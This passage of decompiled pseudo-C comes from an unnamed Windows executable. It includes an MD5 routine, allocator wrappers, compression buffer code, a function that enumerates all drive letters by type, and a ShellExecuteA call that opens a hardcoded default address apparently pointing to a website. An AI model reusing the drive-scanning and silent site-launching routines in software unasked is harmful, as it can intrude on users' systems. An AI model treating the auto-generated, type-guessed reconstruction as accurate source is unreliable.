  HIDWORD(v4) = (int)v4 % 3600 % 60;
  result = a4;
  *a4 = HIDWORD(v4);
  return result;
}

//----- (00404250) --------------------------------------------------------
int sub_404250()
{
  unknown_libname_3();
  return atexit(unknown_libname_4);
}
// 404260: using guessed type int unknown_libname_3(void);

//----- (00404290) --------------------------------------------------------
int __stdcall sub_404290(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_42AF70 )
  {
    result = dword_42AF70(a1, a2, a3);
    dword_42AF50 = result;
  }
  else
  {
    dword_42AF50 = 0;
    return 0;
  }
  return result;
}
// 42AF50: using guessed type int dword_42AF50;
// 42AF70: using guessed type int (__stdcall *dword_42AF70)(_DWORD, _DWORD, _DWORD);

//----- (004042D0) --------------------------------------------------------
int __stdcall sub_4042D0(int a1, int (__stdcall *a2)(_DWORD, _DWORD, _DWORD), int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_42AF70 = a2;
  return result;
}
// 42AF70: using guessed type int (__stdcall *dword_42AF70)(_DWORD, _DWORD, _DWORD);

//----- (004042F0) --------------------------------------------------------
int __cdecl sub_4042F0(int a1)
{
  return sub_404290(2024, a1, 0);
}

//----- (00404310) --------------------------------------------------------
void __cdecl sub_404310(_DWORD *a1, int a2, int *a3)
{
  int v3; // esi
  char **v4; // eax
  const char **v5; // ebx
  int v6; // eax
  int v7; // ebp
  _DWORD *v8; // eax
  int *v9; // eax
  int *v10; // esi
  int v11; // esi
  char *v12; // edx
  _DWORD *v13; // eax
  int *v14; // ecx
  _DWORD *v15; // edx
  int v16; // edi
  int i; // [esp+Ch] [ebp-24h]
  char **v18; // [esp+10h] [ebp-20h]
  int *v19; // [esp+14h] [ebp-1Ch]
  _DWORD v20[6]; // [esp+18h] [ebp-18h] BYREF
  int v21; // [esp+3Ch] [ebp+Ch]

  sub_4045A0(v20);
  if ( !a3[2] || (v3 = *a3, *a3 < 0) || v3 > 4 )
    v3 = 0;
  v4 = (char **)malloc(0x68u);
  v5 = (const char **)v4;
  v18 = v4;
  switch ( v3 )
  {
    case 1:
      v6 = sub_4045F0(3, v4);
      break;
    case 2:
      v6 = sub_4045F0(5, v4);
      break;
    case 3:
      v6 = sub_4045F0(2, v4);
      break;
    case 4:
      v6 = sub_4045F0(4, v4);
      break;
    default:
      v6 = sub_4045F0(0, v4);
      break;
  }
  v7 = v6;
  if ( v6 )
  {
    v9 = (int *)malloc(4 * v6);
    v10 = v9;
    v19 = v9;
    if ( v7 > 0 )
    {
      v11 = (char *)v9 - (char *)v5;
      v21 = v7;
      for ( i = (char *)v9 - (char *)v5; ; v11 = i )
      {
        v12 = (char *)sub_4042F0(3);
        *(const char **)((char *)v5 + v11) = v12;
        strcpy(v12, *v5);
        sub_40B886((LPVOID)*v5++);
        if ( !--v21 )
          break;
      }
      v5 = (const char **)v18;
      v10 = v19;
    }
    v13 = (_DWORD *)sub_4042F0(4 * v7 + 8);
    *v13 = 1;
    v13[1] = v7;
    if ( v7 > 0 )
    {
      v14 = v10;
      v15 = v13 + 2;
      do
      {
        v16 = *v14++;
        *v15++ = v16;
        --v7;
      }
      while ( v7 );
    }
    *a1 = v13;
    sub_40B886(v10);
    sub_40B886(v5);
    sub_4045E0(v20);
  }
  else
  {
    sub_40B886(v5);
    v8 = (_DWORD *)sub_4042F0(8);
    *v8 = 1;
    v8[1] = 0;
    *a1 = v8;
    sub_4045E0(v20);
  }
}
// 404310: using guessed type _DWORD var_18[6];

//----- (004044A0) --------------------------------------------------------
void __cdecl sub_4044A0(int a1, int a2, int a3)
{
  const CHAR *v3; // eax
  LPCSTR lpFile; // [esp+0h] [ebp-10h] BYREF
  _DWORD v5[3]; // [esp+4h] [ebp-Ch] BYREF

  sub_404700(v5);
  if ( *(_DWORD *)(a3 + 8) )
    v3 = *(const CHAR **)a3;
  else
    v3 = aWwwDywtComCn;
  sub_417D20((CString *)&lpFile, v3);
  sub_404740(lpFile);
  sub_417CB2(&lpFile);
  sub_404730(v5);
}
// 4044A0: using guessed type _DWORD var_C[3];

//----- (004044F0) --------------------------------------------------------
unsigned int *__thiscall sub_4044F0(unsigned int *lpMem, char a2)
{
  sub_404510(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (00404510) --------------------------------------------------------
BOOL __thiscall sub_404510(unsigned int *this)
{
  *this = (unsigned int)&off_41F510;
  return sub_41B3A3(this);
}
// 41F510: using guessed type int (*off_41F510)();

//----- (00404560) --------------------------------------------------------
int sub_404560()
{
  unknown_libname_5();
  return atexit(unknown_libname_6);
}
// 404570: using guessed type int unknown_libname_5(void);

//----- (004045A0) --------------------------------------------------------
_DWORD *__thiscall sub_4045A0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[4] = 0;
  this[2] = 0;
  *this = &off_41F51C;
  this[5] = 0;
  this[3] = 0;
  return result;
}
// 41F51C: using guessed type void *off_41F51C;

//----- (004045E0) --------------------------------------------------------
void __thiscall sub_4045E0(_DWORD *this)
{
  *this = &off_41F51C;
}
// 41F51C: using guessed type void *off_41F51C;

//----- (004045F0) --------------------------------------------------------
int __stdcall sub_4045F0(int a1, char **a2)
{
  int v2; // ebp
  char *v4; // eax
  const char *v5; // edi
  bool v6; // zf
  LPCSTR lpRootPathName; // [esp+10h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+20h] [ebp-4h]
  int v11; // [esp+2Ch] [ebp+8h]

  v2 = 0;
  lpRootPathName = (LPCSTR)off_4276D4;
  v10 = 0;
  v9 = 65;
  v11 = 26;
  do
  {
    sub_416670((CString *)&lpRootPathName, aC_0, v9);
    if ( a1 )
    {
      if ( GetDriveTypeA(lpRootPathName) == a1 )
      {
LABEL_5:
        v4 = (char *)malloc(3u);
        v5 = lpRootPathName;
        *a2 = v4;
        strcpy(v4, v5);
        ++v2;
        ++a2;
      }
    }
    else
    {
      switch ( GetDriveTypeA(lpRootPathName) )
      {
        case 2u:
        case 3u:
        case 4u:
        case 5u:
          goto LABEL_5;
        default:
          break;
      }
    }
    v6 = v11 == 1;
    ++v9;
    --v11;
  }
  while ( !v6 );
  v10 = -1;
  sub_417CB2(&lpRootPathName);
  return v2;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00404700) --------------------------------------------------------
_DWORD *__thiscall sub_404700(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_41F520;
  return result;
}
// 41F520: using guessed type void *off_41F520;

//----- (00404730) --------------------------------------------------------
void __thiscall sub_404730(_DWORD *this)
{
  *this = &off_41F520;
}
// 41F520: using guessed type void *off_41F520;

//----- (00404740) --------------------------------------------------------
HINSTANCE __stdcall sub_404740(LPCSTR lpFile)
{
  HWND Window; // eax

  Window = FindWindowExA(0, 0, 0, szWindow);
  return ShellExecuteA(Window, Operation, lpFile, 0, 0, 1);
}

//----- (004047A0) --------------------------------------------------------
int __thiscall sub_4047A0(int this)
{
  int result; // eax

  sub_4047C0((_DWORD *)this, *(LPVOID *)(this + 8));
  result = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 12) = 0;
  return result;
}

//----- (004047C0) --------------------------------------------------------
void __thiscall sub_4047C0(_DWORD *this, LPVOID lpMem)
{
  int v2; // esi
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    v2 = this[1];
    if ( (unsigned int)lpMem < v2 + 100 || (unsigned int)lpMem >= v2 + 49252 )
    {
      ProcessHeap = dword_43740C;
      if ( !dword_43740C )
      {
        ProcessHeap = GetProcessHeap();
        dword_43740C = ProcessHeap;
      }
      HeapFree(ProcessHeap, 0, lpMem);
    }
    else
    {
      *(_BYTE *)(((int)lpMem - v2 - 100) / 512 + v2 + 4) = 0;
      --*(_DWORD *)this[1];
    }
  }
}

//----- (00404830) --------------------------------------------------------
int sub_404830()
{
  if ( (byte_445D29 & 1) == 0 )
    byte_445D29 |= 1u;
  sub_404880();
  if ( (byte_445D2A & 1) == 0 )
    byte_445D2A |= 1u;
  sub_404890();
  if ( (byte_445D2B & 1) == 0 )
    byte_445D2B |= 1u;
  return sub_4048A0();
}
// 445D29: using guessed type char byte_445D29;
// 445D2A: using guessed type char byte_445D2A;
// 445D2B: using guessed type char byte_445D2B;

//----- (00404880) --------------------------------------------------------
int sub_404880()
{
  return atexit(nullsub_5);
}

//----- (00404890) --------------------------------------------------------
int sub_404890()
{
  return atexit(nullsub_5);
}

//----- (004048A0) --------------------------------------------------------
int sub_4048A0()
{
  return atexit(nullsub_5);
}

//----- (004048E0) --------------------------------------------------------
int sub_4048E0()
{
  if ( (byte_445D25 & 1) == 0 )
    byte_445D25 |= 1u;
  sub_404930();
  if ( (byte_445D26 & 1) == 0 )
    byte_445D26 |= 1u;
  sub_404940();
  if ( (byte_445D27 & 1) == 0 )
    byte_445D27 |= 1u;
  return sub_404950();
}
// 445D25: using guessed type char byte_445D25;
// 445D26: using guessed type char byte_445D26;
// 445D27: using guessed type char byte_445D27;

//----- (00404930) --------------------------------------------------------
int sub_404930()
{
  return atexit(nullsub_5);
}

//----- (00404940) --------------------------------------------------------
int sub_404940()
{
  return atexit(nullsub_5);
}

//----- (00404950) --------------------------------------------------------
int sub_404950()
{
  return atexit(nullsub_5);
}

//----- (00404960) --------------------------------------------------------
char *__cdecl sub_404960(const char *a1)
{
  int v1; // kr04_4
  char *result; // eax

  if ( !a1 || !*a1 )
    return 0;
  v1 = strlen(a1) + 1;
  result = (char *)sub_404A00(2024, v1, 0);
  qmemcpy(result, a1, v1 - 1);
  result[v1 - 1] = 0;
  return result;
}

//----- (004049B0) --------------------------------------------------------
char *__cdecl sub_4049B0(char **a1, int a2, int a3)
{
  char *result; // eax
  char v4[36]; // [esp+0h] [ebp-24h] BYREF

  sub_404A60((char *)(*(_DWORD *)a3 + 8), *(_DWORD *)(*(_DWORD *)a3 + 4), v4);
  result = sub_404960(v4);
  *a1 = result;
  return result;
}

//----- (004049E0) --------------------------------------------------------
int __stdcall sub_4049E0(int a1, int a2, int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_437418 = a2;
  return result;
}
// 437418: using guessed type int dword_437418;

//----- (00404A00) --------------------------------------------------------
int __stdcall sub_404A00(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_437418 )
  {
    result = dword_437418(a1, a2, a3);
    dword_437414 = result;
  }
  else
  {
    dword_437414 = 0;
    return 0;
  }
  return result;
}
// 437418: invalid function type '?' has been ignored
// 437414: using guessed type int dword_437414;
// 437418: using guessed type int (__stdcall *dword_437418)(_DWORD, _DWORD, _DWORD);

//----- (00404A40) --------------------------------------------------------
int __stdcall sub_404A40(int a1, int a2, int a3)
{
  return sub_4049E0(a1, a2, a3);
}

//----- (00404A60) --------------------------------------------------------
int __cdecl sub_404A60(char *a1, unsigned int a2, char *a3)
{
  _DWORD v4[26]; // [esp+0h] [ebp-68h] BYREF

  sub_405560(v4);
  v4[25] = 0;
  sub_4056E0(v4, a1, a2);
  return sub_4055F0((int)v4, a3);
}

//----- (00404AC0) --------------------------------------------------------
void __stdcall sub_404AC0(int a1, int a2, unsigned int a3)
{
  unsigned __int16 *v4; // eax
  unsigned __int16 v5; // cx
  int v6; // edx

  if ( a3 )
  {
    v4 = (unsigned __int16 *)(a2 + 2);
    do
    {
      v5 = *v4;
      v6 = *((unsigned __int8 *)v4 - 1);
      v4 += 2;
      a1 += 4;
      *(_DWORD *)(a1 - 4) = *((unsigned __int8 *)v4 - 6) | ((v6 | (v5 << 8)) << 8);
    }
    while ( (unsigned int)v4 - 2 - a2 < a3 );
  }
}

//----- (00404B10) --------------------------------------------------------
int __thiscall sub_404B10(_DWORD *this, int a2)
{
  int v3; // edx
  int v4; // eax
  unsigned __int64 v5; // kr00_8
  int v6; // eax
  unsigned __int64 v7; // kr08_8
  int v8; // ecx
  unsigned __int64 v9; // kr10_8
  int v10; // edx
  unsigned int v11; // eax
  int v12; // edi
  unsigned int v13; // ecx
  int v14; // eax
  unsigned int v15; // edx
  int v16; // ecx
  unsigned int v17; // edi
  int v18; // edx
  unsigned int v19; // eax
  int v20; // edi
  unsigned int v21; // ecx
  int v22; // eax
  unsigned int v23; // edx
  int v24; // ecx
  unsigned int v25; // edi
  int v26; // edx
  unsigned int v27; // eax
  int v28; // edi
  int v29; // eax
  unsigned int v30; // ecx
  int v31; // ebx
  unsigned int v32; // edx
  int v33; // ecx
  unsigned int v34; // edi
  int v35; // edx
  unsigned int v36; // eax
  int v37; // edi
  unsigned int v38; // ebx
  int v39; // eax
  int v40; // ebx
  int v41; // eax
  int v42; // ecx
  int v43; // ecx
  unsigned int v44; // edi
  int v45; // edx
  unsigned int v46; // ebx
  int v47; // edi
  unsigned int v48; // ecx
  int v49; // eax
  unsigned int v50; // edx
  int v51; // ecx
  __int64 v52; // kr18_8
  unsigned int v53; // edx
  unsigned int v54; // eax
  unsigned int v55; // edi
  unsigned int v56; // ecx
  unsigned int v57; // eax
  __int64 v58; // kr20_8
  int v59; // ecx
  unsigned int v60; // edx
  int v61; // ebx
  unsigned int v62; // edx
  int v63; // edi
  unsigned int v64; // eax
  int v65; // edx
  unsigned int v66; // ecx
  int v67; // eax
  unsigned int v68; // ebx
  unsigned int v69; // ebp
  unsigned int v70; // edi
  unsigned int v71; // ebx
  unsigned int v72; // edx
  unsigned int v73; // ecx
  unsigned int v74; // eax
  unsigned int v75; // ebp
  unsigned int v76; // edi
  unsigned int v77; // ebx
  unsigned int v78; // ecx
  unsigned int v79; // eax
  unsigned int v80; // edx
  unsigned int v81; // edi
  unsigned int v82; // ebx
  unsigned int v83; // ecx
  unsigned int v84; // edx
  unsigned int v85; // eax
  int v86; // ecx
  int v87; // edx
  int v88; // edi
  int v89; // eax
  int result; // eax
  int v91; // [esp+10h] [ebp-50h] BYREF
  int v92; // [esp+14h] [ebp-4Ch] BYREF
  int v93; // [esp+18h] [ebp-48h] BYREF
  int v94; // [esp+1Ch] [ebp-44h] BYREF
  int v95; // [esp+20h] [ebp-40h] BYREF
  int v96; // [esp+24h] [ebp-3Ch]
  int v97; // [esp+28h] [ebp-38h]
  int v98; // [esp+2Ch] [ebp-34h]
  int v99; // [esp+30h] [ebp-30h]
  int v100; // [esp+34h] [ebp-2Ch]
  int v101; // [esp+38h] [ebp-28h]
  int v102; // [esp+3Ch] [ebp-24h]
  int v103; // [esp+40h] [ebp-20h]
  int v104; // [esp+44h] [ebp-1Ch]
  int v105; // [esp+48h] [ebp-18h]
  int v106; // [esp+4Ch] [ebp-14h]
  int v107; // [esp+50h] [ebp-10h]
  int v108; // [esp+54h] [ebp-Ch]
  int v109; // [esp+58h] [ebp-8h]
  int v110; // [esp+5Ch] [ebp-4h]

  v3 = this[21];
  v4 = this[19];
  v92 = this[20];
  v93 = v3;
  v91 = v4;
  v94 = this[22];
  sub_404AC0((int)&v95, a2, 0x40u);
  v5 = (unsigned __int64)(v91 + v95 + (v92 & v93 | v94 & (unsigned int)~v92) - 680876936) << 7;
  v6 = v92 + (v5 | HIDWORD(v5));
  v7 = (unsigned __int64)(v94 + v96 + (v6 & v92 | v93 & (unsigned int)~v6) - 389564586) << 12;
  v8 = v6 + (v7 | HIDWORD(v7));
  v9 = (unsigned __int64)(v93 + v97 + (v6 & v8 | v92 & (unsigned int)~v8) + 606105819) << 17;
  v10 = v8 + (v9 | HIDWORD(v9));
  v92 = v10
      + (((v92 + v98 + (v10 & v8 | v6 & (unsigned int)~v10) - 1044525330) >> 10) | ((v92
                                                                                   + v98
                                                                                   + (v10 & v8 | v6 & ~v10)
                                                                                   - 1044525330) << 22));
  v11 = v6 + v99 + (v92 & v10 | v8 & ~v92) - 176418897;
  v12 = v92 + ((v11 << 7) | (v11 >> 25));
  v13 = v8 + v100 + (v12 & v92 | v10 & ~v12) + 1200080426;
  v14 = v12 + ((v13 << 12) | (v13 >> 20));
  v15 = v10 + v101 + (v12 & v14 | v92 & ~v14) - 1473231341;
  v16 = v14 + ((v15 << 17) | (v15 >> 15));
  v92 = v16
      + (((v92 + v102 + (v16 & v14 | v12 & (unsigned int)~v16) - 45705983) >> 10) | ((v92
                                                                                    + v102
                                                                                    + (v16 & v14 | v12 & ~v16)
                                                                                    - 45705983) << 22));
  v17 = v12 + v103 + (v92 & v16 | v14 & ~v92) + 1770035416;
  v18 = v92 + ((v17 << 7) | (v17 >> 25));
  v19 = v14 + v104 + (v18 & v92 | v16 & ~v18) - 1958414417;
  v20 = v18 + ((v19 << 12) | (v19 >> 20));
  v21 = v16 + v105 + (v18 & v20 | v92 & ~v20) - 42063;
  v22 = v20 + ((v21 << 17) | (v21 >> 15));
  v92 = v22
      + (((v92 + v106 + (v22 & v20 | v18 & (unsigned int)~v22) - 1990404162) >> 10) | ((v92
                                                                                      + v106
                                                                                      + (v22 & v20 | v18 & ~v22)
                                                                                      - 1990404162) << 22));
  v23 = v18 + v107 + (v92 & v22 | v20 & ~v92) + 1804603682;
  v24 = v92 + ((v23 << 7) | (v23 >> 25));
  v25 = v20 + v108 + (v24 & v92 | v22 & ~v24) - 40341101;
  v26 = v24 + ((v25 << 12) | (v25 >> 20));
  v27 = v22 + v109 + (v24 & v26 | v92 & ~v26) - 1502002290;
  v28 = v26 + ((v27 << 17) | (v27 >> 15));
  v29 = v28
      + (((v110 + (v28 & v26 | v24 & (unsigned int)~v28) + v92 + 1236535329) >> 10) | ((v110
                                                                                      + (v28 & v26 | v24 & ~v28)
                                                                                      + v92
                                                                                      + 1236535329) << 22));
  v30 = v24 + v96 + (v29 & v26 | v28 & ~v26) - 165796510;
  v31 = v29 + ((32 * v30) | (v30 >> 27));
  v32 = v26 + v101 + (v31 & v28 | v29 & ~v28) - 1069501632;
  v33 = v31 + ((v32 << 9) | (v32 >> 23));
  v34 = v28 + v106 + (v29 & v33 | v31 & ~v29) + 643717713;
  v35 = v33 + ((v34 << 14) | (v34 >> 18));
  v36 = v29 + v95 + (v31 & v35 | v33 & ~v31) - 373897302;
  v37 = v35 + ((v36 >> 12) | (v36 << 20));
  v38 = v31 + v100 + (v37 & v33 | v35 & ~v33) - 701558691;
  v39 = v105 + ((v37 + ((32 * v38) | (v38 >> 27))) & v35 | v37 & ~v35);
  v40 = v37 + ((32 * v38) | (v38 >> 27));
  v41 = v40 + (((v33 + v39 + 38016083) << 9) | ((unsigned int)(v33 + v39 + 38016083) >> 23));
  v42 = v110 + (v37 & v41 | v40 & ~v37);
  v43 = v41 + (((v35 + v42 - 660478335) << 14) | ((unsigned int)(v35 + v42 - 660478335) >> 18));
  v44 = v37 + v99 + (v40 & v43 | v41 & ~v40) - 405537848;
  v45 = v43 + ((v44 >> 12) | (v44 << 20));
  v46 = v40 + v104 + (v45 & v41 | v43 & ~v41) + 568446438;
  v91 = v45 + ((32 * v46) | (v46 >> 27));
  v47 = v91
      + (((v41 + v109 + (v91 & v43 | v45 & ~v43) - 1019803690) << 9) | ((v41
                                                                       + v109
                                                                       + (v91 & v43 | v45 & (unsigned int)~v43)
                                                                       - 1019803690) >> 23));
  v48 = v43 + v98 + (v45 & v47 | v91 & ~v45) - 187363961;
  v49 = v47 + ((v48 << 14) | (v48 >> 18));
  v50 = v45 + v103 + (v91 & v49 | v47 & ~v91) + 1163531501;
  v51 = v49 + ((v50 >> 12) | (v50 << 20));
  v52 = 32i64 * (v91 + v108 + (v51 & v47 | v49 & (unsigned int)~v47) - 1444681467);
  v91 = v51 + (v52 | HIDWORD(v52));
  v53 = v91
      + (((v47 + v97 + (v91 & v49 | v51 & ~v49) - 51403784) << 9) | ((v47
                                                                    + v97
                                                                    + (v91 & v49 | v51 & (unsigned int)~v49)
                                                                    - 51403784) >> 23));
  v54 = v49 + v102 + (v51 & v53 | v91 & ~v51) + 1735328473;
  v55 = v53 + ((v54 << 14) | (v54 >> 18));
  v56 = v51 + v107 + (v91 & v55 | v53 & ~v91) - 1926607734;
  v57 = v55 + ((v56 >> 12) | (v56 << 20));
  v58 = 16i64 * (v91 + v100 + (v57 ^ v55 ^ v53) - 378558);
  v59 = v57 + (v58 | HIDWORD(v58));
  v60 = v53 + v103 + (v59 ^ v57 ^ v55) - 2022574463;
  v61 = v59 + ((v60 << 11) | (v60 >> 21));
  v62 = v55 + v106 + (v59 ^ v57 ^ v61) + 1839030562;
  v63 = v61 + ((v62 << 16) | HIWORD(v62));
  v64 = v57 + v109 + (v59 ^ v63 ^ v61) - 35309556;
  v65 = v63 + ((v64 >> 9) | (v64 << 23));
  v66 = v59 + v96 + (v65 ^ v63 ^ v61) - 1530992060;
  v67 = v65 + ((16 * v66) | (v66 >> 28));
  v68 = v61 + v99 + (v67 ^ v65 ^ v63) + 1272893353;
  v69 = v67 + ((v68 << 11) | (v68 >> 21));
  v70 = v63 + v102 + (v67 ^ v65 ^ v69) - 155497632;
  v71 = v69 + ((v70 << 16) | HIWORD(v70));
  v72 = v65 + v105 + (v67 ^ v71 ^ v69) - 1094730640;
  v73 = v71 + ((v72 >> 9) | (v72 << 23));
  v74 = v73
      + ((16 * (v67 + v108 + (v73 ^ v71 ^ v69) + 681279174)) | ((v67 + v108 + (v73 ^ v71 ^ v69) + 681279174) >> 28));
  v75 = v95 + (v74 ^ v73 ^ v71) + v69 - 358537222;
  v76 = v74 + ((v75 << 11) | (v75 >> 21));
  v77 = v76
      + (((v71 + v98 + (v74 ^ v73 ^ v76) - 722521979) << 16) | ((v71 + v98 + (v74 ^ v73 ^ v76) - 722521979) >> 16));
  v78 = v77 + (((v73 + v101 + (v74 ^ v77 ^ v76) + 76029189) >> 9) | ((v73 + v101 + (v74 ^ v77 ^ v76) + 76029189) << 23));
  v79 = v74 + v104 + (v78 ^ v77 ^ v76) - 640364487;
  v80 = v78 + ((16 * v79) | (v79 >> 28));
  v81 = v80
      + (((v76 + v107 + (v80 ^ v78 ^ v77) - 421815835) << 11) | ((v76 + v107 + (v80 ^ v78 ^ v77) - 421815835) >> 21));
  v82 = v81
      + (((v77 + v110 + (v80 ^ v78 ^ v81) + 530742520) << 16) | ((v77 + v110 + (v80 ^ v78 ^ v81) + 530742520) >> 16));
  v83 = v78 + v97 + (v80 ^ v82 ^ v81) - 995338651;
  v92 = v82 + ((v83 >> 9) | (v83 << 23));
  v84 = v80 + v95 + (v82 ^ (v92 | ~v81)) - 198630844;
  v91 = v92 + ((v84 << 6) | (v84 >> 26));
  v94 = v91
      + (((v81 + v102 + (v92 ^ (v91 | ~v82)) + 1126891415) << 10) | ((v81 + v102 + (v92 ^ (v91 | ~v82)) + 1126891415) >> 22));
  v85 = v82 + v109 + (v91 ^ (v94 | ~v92)) - 1416354905;
  v93 = v94 + ((v85 << 15) | (v85 >> 17));
  sub_4054E0(&v92, v93, v94, v91, v100, 21, -57434055);
  sub_4054E0(&v91, v92, v93, v94, v107, 6, 1700485571);
  sub_4054E0(&v94, v91, v92, v93, v98, 10, -1894986606);
  sub_4054E0(&v93, v94, v91, v92, v105, 15, -1051523);
  sub_4054E0(&v92, v93, v94, v91, v96, 21, -2054922799);
  sub_4054E0(&v91, v92, v93, v94, v103, 6, 1873313359);
  sub_4054E0(&v94, v91, v92, v93, v110, 10, -30611744);
  sub_4054E0(&v93, v94, v91, v92, v101, 15, -1560198380);
  sub_4054E0(&v92, v93, v94, v91, v108, 21, 1309151649);
  sub_4054E0(&v91, v92, v93, v94, v99, 6, -145523070);
  sub_4054E0(&v94, v91, v92, v93, v106, 10, -1120210379);
  sub_4054E0(&v93, v94, v91, v92, v97, 15, 718787259);
  sub_4054E0(&v92, v93, v94, v91, v104, 21, -343485551);
  v86 = v93;
  v87 = this[21];
  v88 = v92 + this[20];
  this[19] += v91;
  this[20] = v88;
  v89 = this[22];
  this[21] = v86 + v87;
  result = v94 + v89;
  this[22] = result;
  return result;
}

//----- (004054E0) --------------------------------------------------------
int __stdcall sub_4054E0(int *a1, int a2, int a3, int a4, int a5, char a6, int a7)
{
  int v7; // ecx
  int result; // eax

  v7 = a7 + a5 + (a3 ^ (a2 | ~a4)) + *a1;
  *a1 = v7;
  result = v7 << a6;
  *a1 = a2 + __ROL4__(v7, a6);
  return result;
}

//----- (00405530) --------------------------------------------------------
void __thiscall sub_405530(_DWORD *this)
{
  *this = &off_41F528;
}
// 41F528: using guessed type void *(__thiscall *off_41F528)(std::locale::facet *__hidden this, unsigned int);

//----- (00405560) --------------------------------------------------------
_DWORD *__thiscall sub_405560(_DWORD *this)
{
  *this = &off_41F528;
  memset(this + 1, 0, 0x40u);
  this[18] = 0;
  this[17] = 0;
  this[19] = 1732584193;
  this[20] = -271733879;
  this[21] = -1732584194;
  this[22] = 271733878;
  return this;
}
// 41F528: using guessed type void *(__thiscall *off_41F528)(std::locale::facet *__hidden this, unsigned int);

//----- (004055A0) --------------------------------------------------------
void __stdcall sub_4055A0(int a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v4; // eax
  char v5; // dl

  if ( a3 )
  {
    v4 = (_BYTE *)(a1 + 1);
    do
    {
      v5 = *a2;
      a2 += 4;
      *(v4 - 1) = v5;
      *v4 = BYTE1(*((_DWORD *)a2 - 1));
      v4[1] = BYTE2(*((_DWORD *)a2 - 1));
      v4[2] = HIBYTE(*((_DWORD *)a2 - 1));
      v4 += 4;
    }
    while ( (unsigned int)&v4[-1 - a1] < a3 );
  }
}

//----- (004055F0) --------------------------------------------------------
int __thiscall sub_4055F0(int this, char *a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  unsigned int v5; // eax
  char v7; // al
  CHAR *v8; // edi
  int result; // eax
  char v10[8]; // [esp+10h] [ebp-24h] BYREF
  CHAR v11[12]; // [esp+18h] [ebp-1Ch] BYREF
  char v12[16]; // [esp+24h] [ebp-10h] BYREF
  int v13; // [esp+38h] [ebp+4h]

  v3 = (_DWORD *)(this + 68);
  sub_4055A0((int)v10, (_BYTE *)(this + 68), 8u);
  v4 = 56;
  v5 = (*v3 >> 3) & 0x3F;
  if ( v5 >= 0x38 )
    v4 = 120;
  sub_4056E0((_DWORD *)this, asc_42572C, v4 - v5);
  sub_4056E0((_DWORD *)this, v10, 8u);
  sub_4055A0((int)v12, (_BYTE *)(this + 76), 0x10u);
  v13 = 0;
  *a2 = 0;
  do
  {
    v7 = v12[v13];
    if ( v7 )
    {
      if ( (unsigned __int8)v7 > 0xFu )
        wsprintfA(v11, "%x", (unsigned __int8)v12[v13]);
      else
        wsprintfA(v11, "0%x", (unsigned __int8)v12[v13]);
      v8 = v11;
    }
    else
    {
      v8 = a00;
    }
    strcat(a2, v8);
    result = ++v13;
  }
  while ( v13 < 16 );
  return result;
}
// 4055F0: using guessed type char var_10[16];

//----- (004056E0) --------------------------------------------------------
unsigned int __thiscall sub_4056E0(_DWORD *this, char *a2, unsigned int a3)
{
  unsigned int v4; // ecx
  unsigned int v5; // edx
  int v6; // eax
  unsigned int v7; // ebp
  unsigned int v8; // edi
  unsigned int i; // esi
  unsigned int v10; // ecx
  char *v11; // esi
  char *v12; // edi
  unsigned int result; // eax

  v4 = a3;
  v5 = this[17] + 8 * a3;
  v6 = (this[17] >> 3) & 0x3F;
  this[17] = v5;
  if ( v5 < 8 * a3 )
    ++this[18];
  v7 = 64 - v6;
  this[18] += a3 >> 29;
  if ( a3 < 64 - v6 )
  {
    v8 = 0;
  }
  else
  {
    qmemcpy((char *)this + v6 + 4, a2, v7);
    sub_404B10(this, (int)(this + 1));
    v8 = v7;
    for ( i = v7 + 63; i < a3; v8 += 64 )
    {
      sub_404B10(this, (int)&a2[i - 63]);
      i += 64;
    }
    v4 = a3;
    v6 = 0;
  }
  v10 = v4 - v8;
  v11 = &a2[v8];
  v12 = (char *)this + v6 + 4;
  result = v10;
  qmemcpy(v12, v11, v10);
  return result;
}

//----- (004057A0) --------------------------------------------------------
_DWORD *__cdecl sub_4057A0(int a1)
{
  _DWORD *result; // eax
  int v2; // esi
  unsigned int v3; // edx
  int v4; // ecx
  int v5; // ecx
  unsigned int v6; // edi

  result = (_DWORD *)a1;
  v2 = *(_DWORD *)(a1 + 28);
  v3 = *(_DWORD *)(v2 + 20);
  if ( v3 > *(_DWORD *)(a1 + 16) )
    v3 = *(_DWORD *)(a1 + 16);
  if ( v3 )
  {
    qmemcpy(*(void **)(a1 + 12), *(const void **)(v2 + 16), v3);
    v4 = *(_DWORD *)(a1 + 28);
    *(_DWORD *)(a1 + 12) += v3;
    *(_DWORD *)(v4 + 16) += v3;
    v5 = *(_DWORD *)(a1 + 28);
    v6 = *(_DWORD *)(a1 + 16) - v3;
    *(_DWORD *)(a1 + 20) += v3;
    *(_DWORD *)(a1 + 16) = v6;
    *(_DWORD *)(v5 + 20) -= v3;
    result = *(_DWORD **)(a1 + 28);
    if ( !result[5] )
      result[4] = result[2];
  }
  return result;
}

//----- (00405820) --------------------------------------------------------
int __cdecl sub_405820(int *a1, int a2)
{
  int v2; // ebx
  unsigned int v3; // eax
  int v4; // ecx
  bool v5; // zf
  int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  _BYTE *v9; // edx
  int v10; // ecx
  unsigned int v11; // edx
  _BYTE *v12; // eax
  int v13; // ecx
  _BYTE *v14; // eax
  int v16; // eax
  int v17; // [esp-14h] [ebp-20h]
  int v18; // [esp-14h] [ebp-20h]
  int v19; // [esp-14h] [ebp-20h]

  v2 = 0xFFFF;
  if ( (unsigned int)(a1[3] - 5) < 0xFFFF )
    v2 = a1[3] - 5;
  while ( 1 )
  {
    v3 = a1[27];
    if ( v3 <= 1 )
    {
      sub_405980((int)a1);
      v3 = a1[27];
      if ( !v3 )
        break;
    }
    v4 = a1[25];
    a1[27] = 0;
    v5 = v3 + v4 == 0;
    a1[25] = v3 + v4;
    v6 = a1[21];
    v7 = a1[25];
